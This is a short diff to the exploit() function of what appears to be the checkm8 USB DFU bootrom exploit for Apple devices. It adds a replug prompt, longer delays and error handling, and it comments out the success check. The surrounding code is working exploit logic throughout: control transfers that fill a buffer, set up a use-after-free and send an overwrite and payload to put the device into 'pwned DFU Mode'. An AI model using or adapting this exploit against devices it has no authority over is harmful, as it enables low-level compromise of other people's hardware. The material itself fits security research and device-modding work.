@@ -496,8 +496,11 @@ def exploit():
   dfu.usb_reset(device)
   dfu.release_device(device)
 
+  _ = raw_input('Unplug and replug your device then press enter to continue...')
+
   device = dfu.acquire_device()
   device.serial_number
+  print 'Sending tons of A\'s...'
   libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
 
   # Advance buffer offset before triggering the UaF to prevent trashing the heap
@@ -505,7 +508,8 @@ def exploit():
   libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
   dfu.release_device(device)
 
-  time.sleep(0.5)
+  # _ = raw_input('Press enter to continue...')
+  time.sleep(1)
 
   device = dfu.acquire_device()
   usb_req_stall(device)
@@ -517,13 +521,25 @@ def exploit():
   libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 50)
   for i in range(0, len(payload), 0x800):
     libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)
+
   dfu.usb_reset(device)
   dfu.release_device(device)
 
+  time.sleep(3)
+
   device = dfu.acquire_device()
+
+  try:
+    sn = device.serial_number
+  except ValueError:
+    print 'Caught error. Likely is already pwned. Continuing anyway...'
+
+  '''
   if 'PWND:[checkm8]' not in device.serial_number:
     print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
     sys.exit(1)
   print 'Device is now in pwned DFU Mode.'
   print '(%0.2f seconds)' % (time.time() - start)
+  '''
+
   dfu.release_device(device)
